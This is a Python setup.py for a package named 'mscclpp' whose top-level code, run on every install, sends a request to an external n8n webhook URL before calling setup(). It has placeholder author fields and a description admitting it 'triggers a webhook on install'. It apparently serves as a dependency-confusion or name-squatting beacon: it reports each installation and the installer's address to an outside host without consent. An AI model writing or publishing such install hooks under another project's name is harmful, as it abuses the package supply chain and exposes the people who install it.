import urllib.request
import urllib.error

# Trigger webhook on install
try:
    req = urllib.request.Request(
        "https://n8n.holcron.ai/webhook/56f42bf2-690b-4bd8-9796-a913071cb778"
    )  # Replace with your webhook URL
    with urllib.request.urlopen(req) as response:
        print("Webhook triggered successfully")
except urllib.error.URLError as e:
    print(f"Failed to trigger webhook: {e}")

from setuptools import setup

with open("README.md", "r") as fh:
    long_description = fh.read()

setup(
    name="mscclpp",
    version="0.6.1",
    author="Your Name",
    author_email="your.email@example.com",
    description="A package that triggers a webhook on install",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/webhook-package",  # Optional
    packages=["webhook_package"],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
